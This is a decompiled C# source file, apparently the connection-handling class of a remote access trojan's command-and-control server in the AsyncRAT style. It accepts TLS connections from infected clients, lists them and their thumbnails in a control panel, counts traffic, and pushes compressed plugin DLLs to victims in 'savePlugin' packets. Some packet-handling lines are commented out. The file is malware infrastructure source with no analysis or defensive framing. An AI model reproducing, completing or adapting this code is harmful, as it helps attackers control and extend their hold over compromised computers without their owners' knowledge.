using System;
using System.Drawing;
using System.IO;
using System.Net.Security;
using System.Net.Sockets;
using System.Security.Authentication;
using System.Threading;
using System.Windows.Forms;
using Org.BouncyCastle.Bcpg;
using Server.Algorithm;
using Server.Handle_Packet;
using Server.MessagePack;

namespace Server.Connection
{
	// Token: 0x0200002B RID: 43
	public class Clients
	{
		// Token: 0x1700003C RID: 60
		// (get) Token: 0x0600017E RID: 382 RVA: 0x000028A0 File Offset: 0x00000AA0
		// (set) Token: 0x0600017F RID: 383 RVA: 0x000028A8 File Offset: 0x00000AA8
		public Socket TcpClient { get; set; }

		// Token: 0x1700003D RID: 61
		// (get) Token: 0x06000180 RID: 384 RVA: 0x000028B1 File Offset: 0x00000AB1
		// (set) Token: 0x06000181 RID: 385 RVA: 0x000028B9 File Offset: 0x00000AB9
		public SslStream SslClient { get; set; }

		// Token: 0x1700003E RID: 62
		// (get) Token: 0x06000182 RID: 386 RVA: 0x000028C2 File Offset: 0x00000AC2
		// (set) Token: 0x06000183 RID: 387 RVA: 0x000028CA File Offset: 0x00000ACA
		public ListViewItem LV { get; set; }

		// Token: 0x1700003F RID: 63
		// (get) Token: 0x06000184 RID: 388 RVA: 0x000028D3 File Offset: 0x00000AD3
		// (set) Token: 0x06000185 RID: 389 RVA: 0x000028DB File Offset: 0x00000ADB
		public ListViewItem LV2 { get; set; }

		// Token: 0x17000040 RID: 64
		// (get) Token: 0x06000186 RID: 390 RVA: 0x000028E4 File Offset: 0x00000AE4
		// (set) Token: 0x06000187 RID: 391 RVA: 0x000028EC File Offset: 0x00000AEC
		public string ID { get; set; }

		// Token: 0x17000041 RID: 65
		// (get) Token: 0x06000188 RID: 392 RVA: 0x000028F5 File Offset: 0x00000AF5
		// (set) Token: 0x06000189 RID: 393 RVA: 0x000028FD File Offset: 0x00000AFD
		private byte[] ClientBuffer { get; set; }

		// Token: 0x17000042 RID: 66
		// (get) Token: 0x0600018A RID: 394 RVA: 0x00002906 File Offset: 0x00000B06
		// (set) Token: 0x0600018B RID: 395 RVA: 0x0000290E File Offset: 0x00000B0E
		private long HeaderSize { get; set; }

		// Token: 0x17000043 RID: 67
		// (get) Token: 0x0600018C RID: 396 RVA: 0x00002917 File Offset: 0x00000B17
		// (set) Token: 0x0600018D RID: 397 RVA: 0x0000291F File Offset: 0x00000B1F
		private long Offset { get; set; }

		// Token: 0x17000044 RID: 68
		// (get) Token: 0x0600018E RID: 398 RVA: 0x00002928 File Offset: 0x00000B28
		// (set) Token: 0x0600018F RID: 399 RVA: 0x00002930 File Offset: 0x00000B30
		private bool ClientBufferRecevied { get; set; }

		// Token: 0x17000045 RID: 69
		// (get) Token: 0x06000190 RID: 400 RVA: 0x00002939 File Offset: 0x00000B39
		// (set) Token: 0x06000191 RID: 401 RVA: 0x00002941 File Offset: 0x00000B41
		public object SendSync { get; set; }

		// Token: 0x17000046 RID: 70
		// (get) Token: 0x06000192 RID: 402 RVA: 0x0000294A File Offset: 0x00000B4A
		// (set) Token: 0x06000193 RID: 403 RVA: 0x00002952 File Offset: 0x00000B52
		public long BytesRecevied { get; set; }

		// Token: 0x17000047 RID: 71
		// (get) Token: 0x06000194 RID: 404 RVA: 0x0000295B File Offset: 0x00000B5B
		// (set) Token: 0x06000195 RID: 405 RVA: 0x00002963 File Offset: 0x00000B63
		public string Ip { get; set; }

		// Token: 0x06000196 RID: 406 RVA: 0x0001A0C0 File Offset: 0x000182C0
		public Clients(Socket socket)
		{
			this.SendSync = new object();
			this.TcpClient = socket;
			this.Ip = this.TcpClient.RemoteEndPoint.ToString().Split(new char[]
			{
				':'
			})[0];
			this.SslClient = new SslStream(new NetworkStream(this.TcpClient, true), false);
			this.SslClient.BeginAuthenticateAsServer(Settings.ServerCertificate, false, SslProtocols.Tls, false, new AsyncCallback(this.EndAuthenticate), null);
		}

		// Token: 0x06000197 RID: 407 RVA: 0x0001A14C File Offset: 0x0001834C
		private void EndAuthenticate(IAsyncResult ar)
		{
			try
			{
				this.SslClient.EndAuthenticateAsServer(ar);
				this.Offset = 0L;
				this.HeaderSize = 4L;
				this.ClientBuffer = new byte[this.HeaderSize];
				this.SslClient.BeginRead(this.ClientBuffer, (int)this.Offset, (int)this.HeaderSize, new AsyncCallback(this.ReadClientData), null);
			}
			catch
			{
				SslStream sslClient = this.SslClient;
				if (sslClient != null)
				{
					sslClient.Dispose();
				}
				Socket tcpClient = this.TcpClient;
				if (tcpClient != null)
				{
					tcpClient.Dispose();
				}
			}
		}

		// Token: 0x06000198 RID: 408 RVA: 0x0001A1FC File Offset: 0x000183FC
		public void ReadClientData(IAsyncResult ar)
		{
			try
			{
				if (!this.TcpClient.Connected)
				{
					this.Disconnected();
				}
				else
				{
					int num = this.SslClient.EndRead(ar);
					if (num > 0)
					{
						this.HeaderSize -= (long)num;
						this.Offset += (long)num;
						if (!this.ClientBufferRecevied)
						{
							if (this.HeaderSize == 0L)
							{
								this.HeaderSize = (long)BitConverter.ToInt32(this.ClientBuffer, 0);
								if (this.HeaderSize > 0L)
								{
									this.ClientBuffer = new byte[this.HeaderSize];
									this.Offset = 0L;
									this.ClientBufferRecevied = true;
								}
							}
							else if (this.HeaderSize < 0L)
							{
								this.Disconnected();
								return;
							}
						}
						else
						{
							object lockReceivedSendValue = Settings.LockReceivedSendValue;
							lock (lockReceivedSendValue)
							{
								Settings.ReceivedValue += (long)num;
							}
							this.BytesRecevied += (long)num;
							if (this.HeaderSize == 0L)
							{
								//ThreadPool.QueueUserWorkItem(new WaitCallback(new Packet
								//{
								//	//client = this,
								//	//data = this.ClientBuffer
								////}.Read), null);
								////this.Offset = 0L;
								////this.HeaderSize = 4L;
								////this.ClientBuffer = new byte[this.HeaderSize];
								////this.ClientBufferRecevied = false;
							}
							else if (this.HeaderSize < 0L)
							{
								this.Disconnected();
								return;
							}
						}
						this.SslClient.BeginRead(this.ClientBuffer, (int)this.Offset, (int)this.HeaderSize, new AsyncCallback(this.ReadClientData), null);
					}
					else
					{
						this.Disconnected();
					}
				}
			}
			catch
			{
				this.Disconnected();
			}
		}

		// Token: 0x06000199 RID: 409 RVA: 0x0001A408 File Offset: 0x00018608
		public void Disconnected()
		{
			if (this.LV != null)
			{
				Program.form1.Invoke(new MethodInvoker(delegate()
				{
					try
					{
						object obj = Settings.LockListviewClients;
						lock (obj)
						{
							this.LV.Remove();
						}
						if (this.LV2 != null)
						{
							obj = Settings.LockListviewThumb;
							lock (obj)
							{
								this.LV2.Remove();
							}
						}
					}
					catch
					{
					}
					new HandleLogs().Addmsg("Client " + this.Ip + " disconnected", Color.Red);
				}));
			}
			try
			{
				SslStream sslClient = this.SslClient;
				if (sslClient != null)
				{
					sslClient.Dispose();
				}
				Socket tcpClient = this.TcpClient;
				if (tcpClient != null)
				{
					tcpClient.Dispose();
				}
			}
			catch
			{
			}
		}

		// Token: 0x0600019A RID: 410 RVA: 0x0001A46C File Offset: 0x0001866C
		public void Send(object msg)
		{
			object sendSync = this.SendSync;
			lock (sendSync)
			{
				try
				{
					if (!this.TcpClient.Connected)
					{
						this.Disconnected();
					}
					else if ((byte[])msg != null)
					{
						byte[] array = (byte[])msg;
						byte[] bytes = BitConverter.GetBytes(array.Length);
						this.TcpClient.Poll(-1, SelectMode.SelectWrite);
						this.SslClient.Write(bytes, 0, bytes.Length);
						object lockReceivedSendValue;
						if (array.Length > 1000000)
						{
							using (MemoryStream memoryStream = new MemoryStream(array))
							{
								memoryStream.Position = 0L;
								byte[] array2 = new byte[50000];
								int num;
								while ((num = memoryStream.Read(array2, 0, array2.Length)) > 0)
								{
									this.TcpClient.Poll(-1, SelectMode.SelectWrite);
									this.SslClient.Write(array2, 0, num);
									this.SslClient.Flush();
									lockReceivedSendValue = Settings.LockReceivedSendValue;
									lock (lockReceivedSendValue)
									{
										Settings.SentValue += (long)num;
									}
								}
								goto IL_16D;
							}
						}
						this.TcpClient.Poll(-1, SelectMode.SelectWrite);
						this.SslClient.Write(array, 0, array.Length);
						this.SslClient.Flush();
						lockReceivedSendValue = Settings.LockReceivedSendValue;
						lock (lockReceivedSendValue)
						{
							Settings.SentValue += (long)array.Length;
						}
						IL_16D:;
					}
				}
				catch
				{
					this.Disconnected();
				}
			}
		}

		// Token: 0x0600019B RID: 411 RVA: 0x0001A678 File Offset: 0x00018878
		public void SendPlugin(string hash)
		{
			try
			{
				foreach (string text in Directory.GetFiles("Plugins", "*.dll", SearchOption.TopDirectoryOnly))
				{
					if (hash == GetHash.GetChecksum(text))
					{
						MsgPack msgPack = new MsgPack();
						msgPack.ForcePathObject("Packet").SetAsString("savePlugin");
						msgPack.ForcePathObject("Dll").SetAsBytes(Zip.Compress(File.ReadAllBytes(text)));
						msgPack.ForcePathObject("Hash").SetAsString(GetHash.GetChecksum(text));
						ThreadPool.QueueUserWorkItem(new WaitCallback(this.Send), msgPack.Encode2Bytes());
						new HandleLogs().Addmsg("Plugin " + Path.GetFileName(text) + " sent to client " + this.Ip, Color.Blue);
						break;
					}
				}
			}
			catch (Exception ex)
			{
				new HandleLogs().Addmsg("Client " + this.Ip + " " + ex.Message, Color.Red);
			}
		}
	}
}
